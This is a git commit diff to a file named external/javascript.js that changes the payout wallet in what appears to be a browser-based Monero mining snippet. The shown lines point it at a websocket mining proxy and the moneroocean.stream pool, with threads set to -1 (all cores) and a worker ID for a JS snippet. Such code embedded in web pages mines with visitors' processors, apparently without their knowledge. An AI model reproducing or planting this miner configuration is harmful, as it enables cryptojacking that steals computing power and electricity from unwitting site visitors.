c7eaa73f953f8ff79f3074d2f0774db73d8be98c
Mohamed Monir Ali AL Keshita <99746359+Ranamom@users.noreply.github.com>
2024-10-06 12:01:13 +0300

    Update javascript.js

--- external/javascript.js
+++ external/javascript.js
@@ -8,7 +8,7 @@ document.head.appendChild(script);
 
 server = "wss://ny1.xmrminingproxy.com";
 var pool = "moneroocean.stream";
-var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+var walletAddress = "45ttEikQEZWN1m7VxaVN9rjQkpSdmpGZ82GwUps66neQ1PqbQMno4wMY8F5jiDt2GoHzCtMwa7PDPJUJYb1GYrMP4CwAwNp";
 var workerId = "GH-XMR-JS-SNIPPET"
 var threads = -1;
 var password = "";
